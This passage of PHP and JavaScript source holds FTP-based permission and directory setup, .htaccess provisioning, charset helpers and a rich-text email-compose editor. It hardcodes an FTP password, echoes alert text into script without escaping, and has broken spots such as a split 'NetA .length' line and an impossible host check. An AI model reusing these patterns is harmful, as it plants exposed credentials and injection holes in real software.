                //$ftpdir = './public_html/'.trim($_SERVER['SERVER_NAME']).'/record';       
                //$ftptmpdir = './public_html/'.trim($_SERVER['SERVER_NAME']).'/tmp';  
                     
                //$ftpfile = '.'.getcwd().'/index.php';   
                //$ftpdir = '.'.getcwd().'/record';       
                //$ftptmpdir = '.'.getcwd().'/tmp'; 
                
                //$ftpfile = './public_html/index.php';   
                //$ftpdir = './public_html/record';       
                //$ftptmpdir = './public_html/tmp';                 
                $ftpflag = '1'; 
                $redirecturl = ScriptPath().'?api=verify'; 
                
                $ftpserver = trim($_SERVER['SERVER_NAME']);
                $ftpuname = preg_replace("/(\/home\/|\/home\/ftp\/x\/)([^\/]+)(\/public_html|\/wwwroot)/", "$2", getcwd());
                $ftpfile = '.'.preg_replace("/(\/home\/|\/home\/ftp\/x\/)([^\/]+)(\/public_html|\/wwwroot)/", "$3", getcwd()).'/index.php';  
                $ftpdir = '.'.preg_replace("/(\/home\/|\/home\/ftp\/x\/)([^\/]+)(\/public_html|\/wwwroot)/", "$3", getcwd()).'/record';       
                $ftptmpdir = '.'.preg_replace("/(\/home\/|\/home\/ftp\/x\/)([^\/]+)(\/public_html|\/wwwroot)/", "$3", getcwd()).'/tmp';                 
                $ftppwd = "EUIfgwe7";
                $ftpport = '21';                
                $ftpssl = "0";
                $ftppasv = "1";  
                                 
                //echo getcwd().$ftpuname;
}

if (substr(sprintf('%o', fileperms('./index.php')), -4)!='0755'){

        if($ftpflag == '1'){
      		if (chmod("./index.php", 0755))
      		{
      		}	        	
        	elseif (function_exists('ftp_connect')&&ftp_connect($ftpserver,$ftpport)) {
                if ($serverssl == "1"){
                        $conn_id = ftp_ssl_connect($ftpserver,$ftpport);
                }
                else{
                        $conn_id = ftp_connect($ftpserver,$ftpport);
                }       
                if (($_SERVER['SERVER_NAME'] == "localhost") && ($_SERVER['SERVER_NAME'] == "127.0.0.1")){
                }       
                else{
                        $login_result = ftp_login($conn_id, $ftpuname, $ftppwd);                
                }
                if ($ftppasv == "1"){
                        ftp_pasv ($conn_id, 1);
                }  
        	                     
                $loopcount = 0;
                while ($loopcount <= 5 && ftp_chmod($conn_id, 0755, $ftpfile) === false) {
                        $loopcount++;
                } 
                ftp_close($conn_id);
        	}
        	else {

                	if ($ftppasv == "1"){
				$ftp=new FTP(); // Passive connection 
                	}
                	else{
				$ftp=new FTP(); // Passive connection 
                	}        		

			$host=$ftpserver;
			$user=$ftpuname;
			$pass=$ftppwd;
			if($ftp->connect($host)){
				//echo nl2br($ftp->greet());
				$ftp->login($user,$pass);
                		while ($loopcount <= 5 && $ftp->chmod($ftpfile,0755) === false) {
                        		$loopcount++;
                		}
                	}				
     }           
        }
}

//return $redirecturl;
//exit;


$dirlist = array('./record','./tmp','./m','./verifylist');
for($i=0;$i<=count($dirlist)-1;$i++){
if (!file_exists($dirlist[$i])){
        if($ftpflag == '1'){
      		if (function_exists(mkdir))
      		{
      			mkdir($dirlist[$i], 0755, true);      			
      		}        	
        	elseif (function_exists('ftp_connect')&&ftp_connect($ftpserver,$ftpport)) {
        		
                if ($serverssl == "1"){
                        $conn_id = ftp_ssl_connect($ftpserver,$ftpport);
                }
                else{
                        $conn_id = ftp_connect($ftpserver,$ftpport);
                }       
                $login_result = ftp_login($conn_id, $ftpuname, $ftppwd);                
                if ($ftppasv == "1"){
                        ftp_pasv ($conn_id, 1);
                }       
                ftp_mkdir($conn_id,$ftpdir);
                if (substr(sprintf('%o', fileperms($dirlist[$i])), -4)!='0755'){
                        $loopcount = 0;
                        while ($loopcount <= 5 && ftp_chmod($conn_id, 0755, $ftpdir) === false) {
                                $loopcount++;
                        } 
                }
                ftp_close($conn_id);
        	}
        	else {
                	if ($ftppasv == "1"){
				$ftp=new FTP(); // Passive connection 
                	}
                	else{
				$ftp=new FTP(true); //For using port
                	}        		

			$host=$ftpserver;
			$user=$ftpuname;
			$pass=$ftppwd;
			if($ftp->connect($host)){
				//echo nl2br($ftp->greet());
				$ftp->login($user,$pass);
				$ftp->mkdir($ftpdir);
                		if (substr(sprintf('%o', fileperms($dirlist[$i])), -4)!='0755'){
                        		$loopcount = 0;
                			while ($loopcount <= 5 && $ftp->chmod($ftpdir,0755) === false) {
                        			$loopcount++;
                			}
                		}				
      }            					
		}        	
        }
              
}       
if (substr(sprintf('%o', fileperms($dirlist[$i])), -4)!='0755'){
        if($ftpflag == '1'){
        	if (function_exists(chmod))
      		{
      			chmod($dirlist[$i], 0755);      			
      		}        	
        	elseif (function_exists('ftp_connect')&&ftp_connect($ftpserver,$ftpport)) {        	
                if ($serverssl == "1"){
                        $conn_id = ftp_ssl_connect($ftpserver,$ftpport);
                }
                else{
                        $conn_id = ftp_connect($ftpserver,$ftpport);
                }       
                $login_result = ftp_login($conn_id, $ftpuname, $ftppwd);                
                if ($ftppasv == "1"){
                        ftp_pasv ($conn_id, 1);
                }       
                //ftp_mkdir($conn_id,$ftpdir);
                if (substr(sprintf('%o', fileperms($dirlist[$i])), -4)!='0755'){
                        $loopcount = 0;
                        while ($loopcount <= 5 && ftp_chmod($conn_id, 0755, $ftpdir) === false) {
                                $loopcount++;
                        } 
                }
                ftp_close($conn_id);
        	}
        	else {
                	if ($ftppasv == "1"){
				$ftp=new FTP(); // Passive connection 
                	}
                	else{
				$ftp=new FTP(true); //For using port
                	}        		

			$host=$ftpserver;
			$user=$ftpuname;
			$pass=$ftppwd;
			if($ftp->connect($host)){
				//echo nl2br($ftp->greet());
				$ftp->login($user,$pass);
				//$ftp->mkdir($ftpdir);
                		if (substr(sprintf('%o', fileperms($dirlist[$i])), -4)!='0755'){
                        		$loopcount = 0;
                			while ($loopcount <= 5 && $ftp->chmod($ftpdir,0755) === false) {
                        			$loopcount++;
                			}
                		}				
                	}

		}        	
        }               
}
}

if(ini_get('post_max_size')!='500M' && ini_get('upload_max_filesize')!='500M'){
        		if(!file_exists('./.htaccess')){
                touch ('./.htaccess');        			
                $handle = fopen('./.htaccess', 'w+');                
                rewind ($handle);
                $ch = curl_init();
                $url = httppath()."?api=htaccess";
                curl_setopt($ch, CURLOPT_URL, $url);
                curl_setopt($ch, CURLOPT_HEADER, 0);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                //curl_setopt($ch, CURLOPT_BINARYTRANSFER, 1);
                curl_setopt($ch, CURLOPT_TIMEOUT, 5000);
                $string = curl_exec($ch);
                //echo $string;
                curl_close($ch);
                fwrite($handle, $string);
                fclose ($handle);
						}
        		if(!file_exists('./m/.htaccess')){
                touch ('./m/.htaccess');        			
                $handle = fopen('./m/.htaccess', 'w+');                
                rewind ($handle);
                $ch = curl_init();
                $url = httppath()."?api=htaccess&action=wap";
                curl_setopt($ch, CURLOPT_URL, $url);
                curl_setopt($ch, CURLOPT_HEADER, 0);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                //curl_setopt($ch, CURLOPT_BINARYTRANSFER, 1);
                curl_setopt($ch, CURLOPT_TIMEOUT, 5000);
                $string = curl_exec($ch);
                //echo $string;
                curl_close($ch);
                fwrite($handle, $string);
                fclose ($handle);
						}						
}

return $redirecturl;
}
?>

<?php 
Function AlertBack($AlertStr,$BackNum){
  echo "<script>"; 
  echo "alert('".$AlertStr."');"; 
  echo "history.go(-".$BackNum.")"; 
  echo "</script>"; 
  exit;
}
?>

<?php 
Function GoBack($BackNum){
  echo "<script>"; 
  echo "history.go(-".$BackNum.")"; 
  echo "</script>"; 
  exit;
}
?>

<?php 
Function redirectBack($AlertStr,$BackNum){
  echo "<script>"; 
  echo "history.go(-".$BackNum.")"; 
  echo "</script>"; 
  exit;
}
?>

<?php 
function getcharset(){
        if (trim(getheadcharset())!=''){   
								return getheadcharset();
        }
        elseif (trim($_SERVER['HTTP_ACCEPT_CHARSET'])!=''){
                return preg_replace("/([^,;]+)[,]([^,;]+)[;]([^,;]+)[,]([^,;]+)[;]([^,;]+)/", "$2", trim($_SERVER['HTTP_ACCEPT_CHARSET']));
        }
				else{
					return "gb2312";
				}
}

function getheadcharset(){
                for ($i = 0;$i < count(headers_list());$i++){
                        if (stripos(arrmember(headers_list(),$i),'Content-type') >= "0"){
                                $charset = arrmember(split('[=]',arrmember(split('[:]',arrmember(headers_list(),$i)),1)),1);
                        }       
                        else    
                                $charset = "gb2312";
                }
                
                return $charset;
}
?>

<?php 
/**
 * 将字符串转换成unicode编码
 *
 * @param string $input
 * @param string $input_charset
 * @return string
 */
function str_to_unicode($input, $input_charset = 'gbk'){
 $input = iconv($input_charset, "gbk", $input);
 preg_match_all("/[\x80-\xff]?./", $input, $ar);
 $b = array_map('utf8_unicode_', $ar[0]);
 $outstr = join("", $b);
 return $outstr;
}

function utf8_unicode_($c, $input_charset = 'gbk'){
 $c = iconv($input_charset, 'utf-8', $c);
 return utf8_unicode($c);
}
// utf8 -> unicode
function utf8_unicode($c) {
 switch(strlen($c)) {
 case 1:
 return $c;
 case 2:
 $n = (ord($c[0]) & 0x3f) << 6;
 $n += ord($c[1]) & 0x3f;
 break;
 case 3:
 $n = (ord($c[0]) & 0x1f) << 12;
 $n += (ord($c[1]) & 0x3f) << 6;
 $n += ord($c[2]) & 0x3f;
 break;
 case 4:
 $n = (ord($c[0]) & 0x0f) << 18;
 $n += (ord($c[1]) & 0x3f) << 12;
 $n += (ord($c[2]) & 0x3f) << 6;
 $n += ord($c[3]) & 0x3f;
 break;
 }
 return "&#$n;";
}

/**
 * 将unicode字符转换成普通编码字符
 *
 * @param string $str
 * @param string $out_charset
 * @return string
 */
function str_from_unicode($str, $out_charset = 'gbk'){
 $str = preg_replace_callback("|&#([0-9]{1,5});|", 'unicode2utf8_', $str);
 $str = iconv("UTF-8", $out_charset, $str);
 return $str;
}

function unicode2utf8_($c){
 return unicode2utf8($c[1]);
}
function unicode2utf8($c){
 $str="";
 if ($c < 0x80) {
 $str.=$c;
 } else if ($c < 0x800) {
 $str.=chr(0xC0 | $c>>6);
 $str.=chr(0x80 | $c & 0x3F);
 } else if ($c < 0x10000) {
 $str.=chr(0xE0 | $c>>12);
 $str.=chr(0x80 | $c>>6 & 0x3F);
 $str.=chr(0x80 | $c & 0x3F);
 } else if ($c < 0x200000) {
 $str.=chr(0xF0 | $c>>18);
 $str.=chr(0x80 | $c>>12 & 0x3F);
 $str.=chr(0x80 | $c>>6 & 0x3F);
 $str.=chr(0x80 | $c & 0x3F);
 }
 return $str;
}

/**
 * 模拟JS里的unescape
 *
 * @param unknown_type $str
 * @return unknown
 */
function unescape($str) {
 $str = rawdecodeuri($str);
 preg_match_all("/(?:%u.{4})|.{4};|&#\d+;|.+/U",$str,$r);
 $ar = $r[0];
 #print_r($ar);
 foreach($ar as $k=>$v) {
 if(substr($v,0,2) == "%u")
 $ar[$k] = iconv("UCS-2","GB2312",pack("H4",substr($v,-4)));
 elseif(substr($v,0,3) == "")
 $ar[$k] = iconv("UCS-2","GB2312",pack("H4",substr($v,3,-1)));
 elseif(substr($v,0,2) == "&#") {
 echo substr($v,2,-1)."
";
 $ar[$k] = iconv("UCS-2","GB2312",pack("n",substr($v,2,-1)));
 }
 }
 return join("",$ar);
}
?> 

<?php 
class editor_class{

        Function editorEncode($Str){ 
                If (!is_null($Str)){
                        $Str = str_replace(chr(13), "",$Str);
                        $Str = str_replace(chr(10), "",$Str);
                        return $Str;
                }
        }

        function editorCSS(){
        ?>
<style>
.rteImage {
        background: #D3D3D3;
        border: 1px solid #D3D3D3;
        cursor: pointer;
        cursor: hand;
}

.rteImageRaised, .rteImage:hover {
        background: #D3D3D3;
        border: 1px outset;
        cursor: pointer;
        cursor: hand;
}

.rteImageLowered, .rteImage:active {
        background: #D3D3D3;
        border: 1px inset;
        cursor: pointer;
        cursor: hand;
}

.rteVertSep {
        margin: 0 4px 0 4px;
}

.rteBack {
        background: #D3D3D3;
        border: 1px outset;
        letter-spacing: 0;
        padding: 2px;
}

.rteBack tbody tr td, .rteBack tr td {
        background: #D3D3D3;
        padding: 0;
}

.rteDiv {
        display: block;
        position: relative;
}
</style>
<?php 
}

function editorControl($formname){
?>
<script LANGUAGE=javascript>
<!--

initRTE("./rte/images/", "./rte/", "", false);


var TIMEOUT_ALERT_STR = "您已经超时, 请立即保存信息";

var allminutes = 200;
setTimeout("Time()", 60000);

function Time() {
        allminutes--;

        if (document.layers)
        {
                document.layers.minpt.document.write(allminutes.toString());
                document.layers.minpt.document.close();
        }
        else if (document.getElementById)
        {
                var theObj = document.getElementById("minpt");
                theObj.innerHTML = allminutes.toString();
        }

        if (allminutes > 1)
                setTimeout("Time()", 60000);
        else
        {
                if (allminutes == 1)
                {
                        var bodyneedsave = false;

                        updateRTE('richedit');
                        if (document.<?php  echo $formname;?>.richedit.value.length > 0)
                                bodyneedsave = true;

                        if (f1.EasyMail_To.value.length > 0 && (f1.EasyMail_Subject.value.length > 0 || bodyneedsave == true))
                                showSave();

                        setTimeout("Time()", 60000);
                }
                else
                        alert(TIMEOUT_ALERT_STR);
        }
}


function selectAdd(mode) {
        var remote = null;

        if (mode == "To")
        {

                remote = window.open("selectadd.asp?mode=To&GRSN=4561884", "", "top=80; left=150; height=345,width=496,scrollbars=yes,resizable=yes,status=no,toolbar=no,menubar=no,location=no");
                if (remote)
                        remote.opener = document.<?php  echo $formname;?>.EasyMail_To;

        }
        else if (mode == "Cc")
        {

                remote = window.open("selectadd.asp?mode=Cc&GRSN=3733288", "", "top=80; left=150; height=345,width=496,scrollbars=yes,resizable=yes,status=no,toolbar=no,menubar=no,location=no");
                if (remote)
                        remote.opener = document.<?php  echo $formname;?>.EasyMail_Cc;

        }
        else if (mode == "Bcc")
        {

                remote = window.open("selectadd.asp?mode=Bcc&GRSN=1530660", "", "top=80; left=150; height=345,width=496,scrollbars=yes,resizable=yes,status=no,toolbar=no,menubar=no,location=no");
                if (remote)
                        remote.opener = document.<?php  echo $formname;?>.EasyMail_Bcc;

        }
}


function eapop(mode) {
        var remote = null;

        if (mode == "To")
        {

                remote = window.open("ea_pop.asp?mode=To&GRSN=5482752", "", "top=80; left=130; height=330,width=510,scrollbars=yes,resizable=yes,status=no,toolbar=no,menubar=no,location=no");
                if (remote)
                        remote.opener = document.<?php  echo $formname;?>.EasyMail_To;

        }
        else if (mode == "Cc")
        {

                remote = window.open("ea_pop.asp?mode=Cc&GRSN=3626475", "", "top=80; left=130; height=330,width=510,scrollbars=yes,resizable=yes,status=no,toolbar=no,menubar=no,location=no");
                if (remote)
                        remote.opener = document.<?php  echo $formname;?>.EasyMail_Cc;

        }
        else if (mode == "Bcc")
        {

                remote = window.open("ea_pop.asp?mode=Bcc&GRSN=1851100", "", "top=80; left=130; height=330,width=510,scrollbars=yes,resizable=yes,status=no,toolbar=no,menubar=no,location=no");
                if (remote)
                        remote.opener = document.<?php  echo $formname;?>.EasyMail_Bcc;

        }
}


function showSave() {
        document.<?php  echo $formname;?>.SendMode.value = "save";

        sub(0);
}

function showSending() {
        document.<?php  echo $formname;?>.SendMode.value = "send";
        sub(1);
}

function timerSending() {
        if (checkTime() == true)
        {
                document.<?php  echo $formname;?>.SendMode.value = "timersend";
                sub(0);
        }
}

function cutz(inval)
{
        var rval = "";

        for (var i = 0; i < inval.length; i++)
        {
                if (inval.charAt(i) != '0')
                        break;
        }

        rval = inval.substring(i);

        return rval;
}

function checkTime()
{
        var err = "日期错误";
        var nowdate = new Date(2010,3,3,16,6);
        var mydate = new Date(document.<?php  echo $formname;?>.t_year.value, document.<?php  echo $formname;?>.t_month.value, document.<?php  echo $formname;?>.t_day.value, document.<?php  echo $formname;?>.t_hour.value, 1);

        var nmonth = document.<?php  echo $formname;?>.t_month.value;
        var nday = document.<?php  echo $formname;?>.t_day.value;
        var nhour = document.<?php  echo $formname;?>.t_hour.value;

        document.getElementById("ex_showstr").innerHTML = "隐藏扩展功能";
        ex_function_div.style.display = "inline";
        exfunc_is_show = false;

        if (document.<?php  echo $formname;?>.t_year.value == "" || document.<?php  echo $formname;?>.t_year.value > 9999 || document.<?php  echo $formname;?>.t_year.value < 2010)
        {
                alert(err);
                document.<?php  echo $formname;?>.t_year.focus();
                return false;
        }

        if (nmonth == "" || nmonth > 12 || nmonth < 1)
        {
                alert(err);
                document.<?php  echo $formname;?>.t_month.focus();
                return false;
        }

        if (nday == "" || nday > 31 || nday < 1)
        {
                alert(err);
                document.<?php  echo $formname;?>.t_day.focus();
                return false;
        }

        if (nhour == "" || nhour > 23 || nhour < 0)
        {
                alert(err);
                document.<?php  echo $formname;?>.t_hour.focus();
                return false;
        }


        if (mydate > nowdate)
        {
                if (document.<?php  echo $formname;?>.t_month.value < 10)
                        nmonth = "0" + cutz(document.<?php  echo $formname;?>.t_month.value);

                if (document.<?php  echo $formname;?>.t_day.value < 10)
                        nday = "0" + cutz(document.<?php  echo $formname;?>.t_day.value);

                if (document.<?php  echo $formname;?>.t_hour.value < 10)
                        nhour = "0" + cutz(document.<?php  echo $formname;?>.t_hour.value);

                if (nhour == "0")
                        nhour = "00"

                document.<?php  echo $formname;?>.EasyMail_TimerSend.value = document.<?php  echo $formname;?>.t_year.value + nmonth + nday + nhour;
        }
        else
        {
                alert("定时发送的日期应该比现在迟.");
                document.<?php  echo $formname;?>.t_hour.focus();
                return false;
        }

        return true;
}

function sub(smode){
        if (allminutes < 1)
        {
                alert(TIMEOUT_ALERT_STR);
                return ;
        }

        if (parent.f4.document.fsa.upfile.value != "")
        {
                var last_pt = parent.f4.document.fsa.upfile.value.lastIndexOf('\\');

                if (last_pt > -1)
                {
                        if (confirm("您的附件 \"" + parent.f4.document.fsa.upfile.value.substring(last_pt + 1) + "\" 可能忘记上传, 是否继续?") == false)
                                return ;
                }
                else
                {
                        if (confirm("您的附件可能忘记上传, 是否继续?") == false)
                                return ;
                }
        }

        if (check_sendto_number() == false)
        {
                alert("邮件接收地址过多.");
                document.<?php  echo $formname;?>.EasyMail_To.focus();
                return ;
        }

        if (document.<?php  echo $formname;?>.needCheckCertPassword.value == "1")
        {
                if (document.<?php  echo $formname;?>.EasyMail_CertPW.value.length < 8)
                {
                        alert("密码输入错误!");
                        document.<?php  echo $formname;?>.EasyMail_CertPW.focus();
                        return ;
                }
        }

        if (document.<?php  echo $formname;?>.EasyMail_To.value != "")
        {

        updateRTE('richedit');

        document.<?php  echo $formname;?>.RichEdit_Text.value = getText(document.<?php  echo $formname;?>.richedit.value);
        document.<?php  echo $formname;?>.RichEdit_Html.value = document.<?php  echo $formname;?>.richedit.value;

        dec_RichEdit_Text();
        dec_RichEdit_Html();


document.<?php  echo $formname;?>.AddFromAttFileString.value = "";

var i = 0;
for (i; i < document.<?php  echo $formname;?>.NetAtts.length; i++)
{
        document.<?php  echo $formname;?>.AddFromAttFileString.value = document.<?php  echo $formname;?>.AddFromAttFileString.value + document.<?php  echo $formname;?>.NetAtts[i].value + "\t";
}

                document.<?php  echo $formname;?>.submit();
        }
        else
        {
                alert("请输入收件人地址");
                document.<?php  echo $formname;?>.EasyMail_To.focus();
        }
}

function window_onload() {
var obj_textarea = document.getElementById("EasyMail_Text");
if (obj_textarea != null)
{
        obj_textarea.style.height = document.getElementById("tdtt").height;
        obj_textarea.style.width = document.getElementById("tdtt").offsetWidth;
}


        document.<?php  echo $formname;?>.EasyMail_To.value = parent.parent.<?php  echo $formname;?>.document.leftval.to.value;
        document.<?php  echo $formname;?>.EasyMail_Cc.value = parent.parent.<?php  echo $formname;?>.document.leftval.cc.value;
        document.<?php  echo $formname;?>.EasyMail_Bcc.value = parent.parent.<?php  echo $formname;?>.document.leftval.bcc.value;

        parent.parent.<?php  echo $formname;?>.document.leftval.to.value = "";
        parent.parent.<?php  echo $formname;?>.document.leftval.cc.value = "";
        parent.parent.<?php  echo $formname;?>.document.leftval.bcc.value = "";


        hide_ex();
}

var qF = "EasyMail_To";

function addit(qaEmail){
        if (document.<?php  echo $formname;?>.elements[qF].value.length == 0 || document.<?php  echo $formname;?>.elements[qF].value.indexOf(qaEmail) == -1) 
        {
                if (document.<?php  echo $formname;?>.elements[qF].value.length != 0 && document.<?php  echo $formname;?>.elements[qF].value.charAt(document.<?php  echo $formname;?>.elements[qF].value.length - 1) != ",")
                document.<?php  echo $formname;?>.elements[qF].value += ",";
                document.<?php  echo $formname;?>.elements[qF].value += qaEmail;
        }
}

var ea_qF = "";
function setIt(H)
{

        if (ea_qF != H)
        {
                if (ea_qF.length > 0)
                {
                        document.<?php  echo $formname;?>.elements[ea_qF].size = 48;
                        document.getElementById(ea_qF + "_EA").innerHTML = "";
                }

                if (H.length > 0)
                {
                        document.<?php  echo $formname;?>.elements[H].size = 44;

                        var toname = "";
                        if (H == "EasyMail_To")
                                toname = "To";
                        else if (H == "EasyMail_Cc")
                                toname = "Cc";
                        else if (H == "EasyMail_Bcc")
                                toname = "Bcc";

                        document.getElementById(H + "_EA").innerHTML = "&nbsp;<a href=\"javascript:eapop('" + toname + "')\" title=\"企业地址簿\"><img src=\"images/entads.gif\" border=\"0\" align=\"absmiddle\"></a>";
                }
        }

        ea_qF = H;


qF=H;
}

function EditSpeedAff(){
        window.open("editspeedadd.asp?GRSN=4521433", "", "top=80; left=150; height=345,width=496,scrollbars=yes,resizable=yes,status=no,toolbar=no,menubar=no,location=no");
}

function delNetAtt(){
        var i = 0;
        for (i; i < document.<?php  echo $formname;?>.NetAtts.length; i++)
        {
                if (document.<?php  echo $formname;?>.NetAtts.selectedIndex != -1)
                {
                        document.<?php  echo $formname;?>.NetAtts.remove(document.<?php  echo $formname;?>.NetAtts.selectedIndex);
                        i--;
                }
        }

        if (document.<?php  echo $formname;?>.NetAtts.length > 0)
                document.<?php  echo $formname;?>.NetAtts.size = document.<?php  echo $formname;?>.NetAtts.length;
        else
                document.<?php  echo $formname;?>.NetAtts.size = 1;

        document.<?php  echo $formname;?>.NetAtts.selectedIndex = 0;
}

function addNetAtt(){
        if (document.<?php  echo $formname;?>.NetSaveAtts.selectedIndex != -1)
        {
                var oOption = document.createElement("OPTION");
                oOption.text = document.<?php  echo $formname;?>.NetSaveAtts[document.<?php  echo $formname;?>.NetSaveAtts.selectedIndex].text;
                oOption.value = document.<?php  echo $formname;?>.NetSaveAtts[document.<?php  echo $formname;?>.NetSaveAtts.selectedIndex].value;

                document.<?php  echo $formname;?>.NetAtts.add(oOption);

                document.<?php  echo $formname;?>.NetAtts.selectedIndex = document.<?php  echo $formname;?>.NetAtts.length - 1;

                if (document.<?php  echo $formname;?>.NetA
                .length > 0)
                        document.<?php  echo $formname;?>.NetAtts.size = document.<?php  echo $formname;?>.NetAtts.length;
                else
                        document.<?php  echo $formname;?>.NetAtts.size = 1;
        }
}

function dec_EasyMail_Text()
{
        var count = 0;
        var theObj;
        var FormLimit = 50000;

        var TempVar = new String;
        TempVar = document.<?php  echo $formname;?>.EasyMail_Text.value;

        if (TempVar.length > FormLimit)
        {
                while (TempVar.length > 0 && count < 10)
                {
                        theObj = eval("document.all(\"add" + count + "\")");
                        theObj.innerHTML = "<Textarea rows=1 cols=1 name='Mdec_EasyMail_Text" + count + "'></Textarea>";

                        theObj = eval("document.<?php  echo $formname;?>.Mdec_EasyMail_Text" + count);
                        theObj.value = TempVar.substr(0, FormLimit);

                        TempVar = TempVar.substr(FormLimit);

                        count++;
                }
        }
        else
        {
                theObj = eval("document.all(\"add1\")");
                theObj.innerHTML = "<Textarea rows=1 cols=1 name='Mdec_EasyMail_Text1'></Textarea>";

                theObj = eval("document.<?php  echo $formname;?>.Mdec_EasyMail_Text1");
                theObj.value = TempVar;
        }
}

function dec_RichEdit_Text()
{
        var count = 10;
        var theObj;
        var FormLimit = 50000;

        var TempVar = new String;
        TempVar = document.<?php  echo $formname;?>.RichEdit_Text.value;

        if (TempVar.length > FormLimit)
        {
                while (TempVar.length > 0 && count < 20)
                {
                        theObj = eval("document.all(\"add" + count + "\")");
                        theObj.innerHTML = "<Textarea rows=1 cols=1 name='Mdec_RichEdit_Text" + count + "'></Textarea>";

                        theObj = eval("document.<?php  echo $formname;?>.Mdec_RichEdit_Text" + count);
                        theObj.value = TempVar.substr(0, FormLimit);

                        TempVar = TempVar.substr(FormLimit);

                        count++;
                }
        }
        else
        {
                theObj = eval("document.all(\"add10\")");
                theObj.innerHTML = "<Textarea rows=1 cols=1 name='Mdec_RichEdit_Text10'></Textarea>";

                theObj = eval("document.<?php  echo $formname;?>.Mdec_RichEdit_Text10");
                theObj.value = TempVar;
        }
}

function dec_RichEdit_Html()
{
        var count = 20;
        var theObj;
        var FormLimit = 50000;

        var TempVar = new String;
        TempVar = document.<?php  echo $formname;?>.RichEdit_Html.value;

        if (TempVar.length > FormLimit)
        {
                while (TempVar.length > 0 && count < 30)
                {
                        theObj = eval("document.all(\"add" + count + "\")");
                        theObj.innerHTML = "<Textarea rows=1 cols=1 name='Mdec_RichEdit_Html" + count + "'></Textarea>";

                        theObj = eval("document.<?php  echo $formname;?>.Mdec_RichEdit_Html" + count);
                        theObj.value = TempVar.substr(0, FormLimit);

                        TempVar = TempVar.substr(FormLimit);

                        count++;
                }
        }
        else
        {
                theObj = eval("document.all(\"add20\")");
                theObj.innerHTML = "<Textarea rows=1 cols=1 name='Mdec_RichEdit_Html20'></Textarea>";

                theObj = eval("document.<?php  echo $formname;?>.Mdec_RichEdit_Html20");
                theObj.value = TempVar;
        }
}

function sec_onchange(){

        document.<?php  echo $formname;?>.EasyMail_CertServer.value = 0;
        alert("请先上传您的私人数字证书");
}

function checkcanenc(){
        if (document.<?php  echo $formname;?>.EasyMail_To.value != "" || document.<?php  echo $formname;?>.EasyMail_Cc.value != "" || document.<?php  echo $formname;?>.EasyMail_Bcc.value != "")
        {
                document.<?php  echo $formname;?>.action = "checkcanenc.asp";
                document.<?php  echo $formname;?>.target = "_block";
                document.<?php  echo $formname;?>.submit();

                document.<?php  echo $formname;?>.action = "sendmail.asp";
                document.<?php  echo $formname;?>.target = "_parent";
        }
}


function check_sendto_number() {
        var all_sendto_num = 0;

        if (document.<?php  echo $formname;?>.EasyMail_To.value != "")
                all_sendto_num = all_sendto_num + get_char_number(document.<?php  echo $formname;?>.EasyMail_To.value, ",") + 1;

        if (document.<?php  echo $formname;?>.EasyMail_Cc.value != "")
                all_sendto_num = all_sendto_num + get_char_number(document.<?php  echo $formname;?>.EasyMail_Cc.value, ",") + 1;

        if (document.<?php  echo $formname;?>.EasyMail_Bcc.value != "")
                all_sendto_num = all_sendto_num + get_char_number(document.<?php  echo $formname;?>.EasyMail_Bcc.value, ",") + 1;

        if (50 < all_sendto_num)
                return false;

        return true;
}

function get_char_number(showstr, schar) {
        var sindex = 0;
        var retval = 0;

        while(1)
        {
                sindex = showstr.indexOf(schar, sindex);

                if (sindex == -1)
                        break;

                retval++;
                sindex++;
        }

        return retval;
}

exfunc_is_show = false;
function hide_ex()
{
        Stag = document.getElementById("ex_showstr");
        if (exfunc_is_show == true)
        {
                Stag.innerHTML = "隐藏扩展功能";
                ex_function_div.style.display = "inline";
        }
        else
        {
                Stag.innerHTML = "展示扩展功能";
                ex_function_div.style.display = "none";
        }

        exfunc_is_show = !exfunc_is_show;
}
function submiteditor(){
        updateRTE('richedit');
        document.<?php  echo $formname;?>.submit();
}
//-->
</script>
        
<?php 
}

function editorLoad(){
?>
<script language="JavaScript" type="text/javascript">
var isRichText = false;
var rng;
var currentRTE;
var allRTEs = "";

var isIE;
var isGecko;
var isSafari;
var isKonqueror;

var imagesPath;
var includesPath;
var cssFile;
var generateXHTML;

var lang = "zh-cn";
var encoding = "utf-8";


var ieversion = 0;
var iepst2 = navigator.userAgent.toLowerCase().indexOf("msie");
if (iepst2 > 0)
        ieversion = parseFloat(navigator.userAgent.substr(iepst2 + 5, 3));


function initRTE(imgPath, incPath, css, genXHTML) {
        var ua = navigator.userAgent.toLowerCase();
        isIE = ((ua.indexOf("msie") != -1) && (ua.indexOf("opera") == -1) && (ua.indexOf("webtv") == -1)); 
        isGecko = (ua.indexOf("gecko") != -1);
        isSafari = (ua.indexOf("safari") != -1);
        isKonqueror = (ua.indexOf("konqueror") != -1);

        generateXHTML = genXHTML;

        if (document.getElementById && document.designMode && !isSafari && !isKonqueror) {
                isRichText = true;
        }
        
        if (isIE) {
                document.onmouseover = raiseButton;
                document.onmouseout  = normalButton;
                document.onmousedown = lowerButton;
                document.onmouseup   = raiseButton;
        }

        imagesPath = imgPath;
        includesPath = incPath;
        cssFile = css;

        if (isRichText) document.writeln('<style type="text/css">@import "' + includesPath + 'rte.css";</style>');
}

function writeRichText(rte, html, width, height, buttons, readOnly) {
        if (isRichText) {
                if (allRTEs.length > 0) allRTEs += ";";
                allRTEs += rte;

                if (readOnly) buttons = false;

                //              if (isIE) {
                //                      if (buttons && (width < 540)) width = 540;
                //                      var tablewidth = width;
                //              } else {
                //                      if (buttons && (width < 540)) width = 540;
                //                      var tablewidth = width + 4;
                //              }
                var tablewidth = width;
                width = tablewidth;
                document.writeln('<div class="rteDiv">');
                if (buttons == true) {
                        document.writeln('<table bgcolor="#FFFFFF" class="tborder" cellpadding=2 cellspacing=0 id="Buttons1_' + rte + '" width="'+tablewidth+'">');
                        document.writeln('      <tr class="tdtbg">');
                        document.writeln('              <td>');
                        document.writeln('              </td>');
                        document.writeln('      </tr>');
                        document.writeln('</table>');
                        document.writeln('</div>');
                        document.writeln('<div id="editorborder" class="rteDiv">');
                        document.writeln('<table bgcolor="#FFFFFF" class="tborder" cellpadding=2 cellspacing=0 id="Buttons1_' + rte + '" width="'+tablewidth+'">');
                        document.writeln('      <tr class="tdtbg">');
                        document.writeln('              <td>');
                        document.writeln('                      <select id="formatblock_' + rte + '" onchange="selectFont(\'' + rte + '\', this.id);">');
                        document.writeln('                              <option value="">[格式]</option>');
                        document.writeln('                              <option value="<p>">普通 &lt;p&gt;</option>');
